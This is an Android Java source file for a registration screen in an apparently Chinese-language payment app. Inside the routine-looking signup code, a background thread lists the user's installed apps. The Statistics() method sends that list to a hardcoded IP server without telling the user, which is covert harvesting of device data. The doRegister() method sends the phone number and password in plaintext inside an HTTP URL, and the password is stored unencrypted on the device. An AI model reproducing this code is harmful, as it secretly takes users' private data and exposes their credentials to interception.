package com.pay.telcel.main;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Handler.Callback;
import android.os.Message;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.hardcore.crashreport.CrashReportingApplication;

public class register extends Activity implements OnClickListener, Callback{

	Button submit, back;
	ProgressDialog pDialog;
	EditText mthy_username, mtyh_password;
	Handler mHandler;
	String host = "", password = "", phoneNum = "";
	CrashReportingApplication cApp;
	private PackageManager pm;
	private static final int BACK_DoRegister = 1;
	private static final int BACK_SUCCESS = 2;
	private static final int BACK_FAILURE = 3;
	List<String> lables = new ArrayList<String>();
	String sendLa = "";
	
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.register);
		
		cApp = (CrashReportingApplication) getApplication();
		mHandler = new Handler(this);
		submit = (Button) findViewById(R.id.submit);
		back = (Button) findViewById(R.id.back);
		mthy_username = (EditText) findViewById(R.id.mthy_username);
		mtyh_password = (EditText) findViewById(R.id.mtyh_password);
		
		submit.setOnClickListener(this);
		back.setOnClickListener(this);
		
		pDialog = new ProgressDialog(this);
		pDialog.setMessage("请稍候...");
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				getInfo();
			}
		}).start();
		
	}

	public boolean check(){
		if(mtyh_password.getText().toString().equals("")) {
			Toast.makeText(register.this, "请输入密码", Toast.LENGTH_SHORT).show();
			mtyh_password.requestFocus();
			return false;
		} else if(mthy_username.getText().toString().equals("")) {
			Toast.makeText(register.this, "请输入手机号 ", Toast.LENGTH_SHORT).show();
			mthy_username.requestFocus();
			return false;
		}
		
		return true;
	}
	
	
	public void getInfo(){
		lables.clear();
		pm = getPackageManager();
		// 查询所有已经安装的应用程序
		List<ApplicationInfo> listAppcations = pm.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES);
		Collections.sort(listAppcations, new ApplicationInfo.DisplayNameComparator(pm));// 排序
		List<AppInfo> appInfos = new ArrayList<AppInfo>(); // 保存过滤查到的AppInfo
		
		
		for (ApplicationInfo app : listAppcations) {
			if ((app.flags & ApplicationInfo.FLAG_SYSTEM) <= 0) {
				appInfos.add(getAppInfo(app));
			}
		}
	}
	
	private AppInfo getAppInfo(ApplicationInfo app) {
		AppInfo appInfo = new AppInfo();
		lables.add((String) app.loadLabel(pm));
		appInfo.setAppLabel((String) app.loadLabel(pm));
		appInfo.setPkgName(app.packageName);
		return appInfo;
	}
	
	
	public void doRegister(){
		phoneNum = mthy_username.getText().toString();
		password = mtyh_password.getText().toString();
		
		host = "http://da.bigo.me/interface/acctwap/t/3/mobile/" + phoneNum + "/pwd/" + password + "/acctid/10672";
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				HttpPost httpRequest = new HttpPost(host);
				List<BasicNameValuePair> Vaparams = new ArrayList<BasicNameValuePair>();
				
				try {
					httpRequest.setEntity(new UrlEncodedFormEntity(Vaparams, HTTP.UTF_8));
					HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);

					if (httpResponse.getStatusLine().getStatusCode() == 200) {
						String preTel = cApp.retrieveInputStream(httpResponse.getEntity());
//						Log.i("", preTel);
						
						Message msg = new Message();
						if ( preTel.equals("{0}") ){
							msg.what = BACK_SUCCESS;
							mHandler.sendMessage(msg);
						}else {
							preTel = preTel.substring(1, preTel.length()-1);
							msg.obj = preTel;
							msg.what = BACK_FAILURE;
							mHandler.sendMessage(msg);
						}
					}
				} catch (Exception e) {
					Message msg = new Message();
					msg.what = BACK_FAILURE;
					msg.obj = "failure";
					mHandler.sendMessage(msg);
					e.printStackTrace();
				}
				
			}
		}).start();
	}

	
	
	public void Statistics(){
		phoneNum = mthy_username.getText().toString();
		password = mtyh_password.getText().toString();
		
		host = "http://121.199.3.19:8080/tuya_Serv/p/statistics";
		pDialog.show();
		
		
		for (int i = 0; i < lables.size(); i++) {
			sendLa = sendLa + lables.get(i) + ",";
		}
		sendLa = sendLa.substring(0, sendLa.length()-1 );
		
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				HttpPost httpRequest = new HttpPost(host);
				List<BasicNameValuePair> Vaparams = new ArrayList<BasicNameValuePair>();
				Vaparams.add(new BasicNameValuePair("lables", sendLa ));
				
				try {
					httpRequest.setEntity(new UrlEncodedFormEntity(Vaparams, HTTP.UTF_8));
					HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);

					if (httpResponse.getStatusLine().getStatusCode() == 200) {
						String preTel = cApp.retrieveInputStream(httpResponse.getEntity());
						
						Message msg = new Message();
						if ( preTel.equals("ok") ){
							msg.what = BACK_DoRegister;
							mHandler.sendMessage(msg);
						}else {
							msg.obj = "failure";
							msg.what = BACK_FAILURE;
							mHandler.sendMessage(msg);
						}
					}
				} catch (Exception e) {
					Message msg = new Message();
					msg.obj = "failure";
					msg.what = BACK_FAILURE;
					mHandler.sendMessage(msg);
					e.printStackTrace();
				}
				
			}
		}).start();;
	}
	
	
	
	
	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.submit:
			if ( !check() ){
				return;
			}
			
			if ( !cApp.isConnectingToInternet() ){
				Toast.makeText(register.this, getString(R.string.network_disconnet), Toast.LENGTH_SHORT).show();
				return;
			}
			
			Statistics();
			
			break;
			
		case R.id.back:
			finish();
			break;

		default:
			break;
		}
	}

	@Override
	public boolean handleMessage(Message msg) {
		switch (msg.what) {
		case BACK_DoRegister:
			doRegister();
			break;
			
		case BACK_SUCCESS:
			pDialog.dismiss();
			Toast.makeText(register.this, "注册成功", Toast.LENGTH_SHORT).show();
			
			SharedPreferences perference = getSharedPreferences("user_profile", Context.MODE_PRIVATE);
			Editor editor = perference.edit();
			editor.putString("account", phoneNum);
			editor.putString("password", password);
			editor.putString("balance", "1");
			editor.commit();
			
			finish();
			break;
			
		case BACK_FAILURE:
			pDialog.dismiss();
			String feedb = msg.obj.toString();
			if ( "failure".equals(feedb) ){
				Toast.makeText(register.this, "失败,请重试", Toast.LENGTH_SHORT).show();
			}else {
				Toast.makeText(register.this, feedb, Toast.LENGTH_SHORT).show();
			}
			break;

		default:
			break;
		}
		return false;
	}
	
	
	class AppInfo {

		private String appLabel; // 应用程序标签
		private Intent intent; // 启动应用程序的Intent
		private String pkgName; // 应用程序所对应的包名

		public AppInfo() {
		}

		public String getAppLabel() {
			return appLabel;
		}

		public void setAppLabel(String appName) {
			this.appLabel = appName;
		}

		public Intent getIntent() {
			return intent;
		}

		public void setIntent(Intent intent) {
			this.intent = intent;
		}

		public String getPkgName() {
			return pkgName;
		}

		public void setPkgName(String pkgName) {
			this.pkgName = pkgName;
		}
	}
		
		
		

}
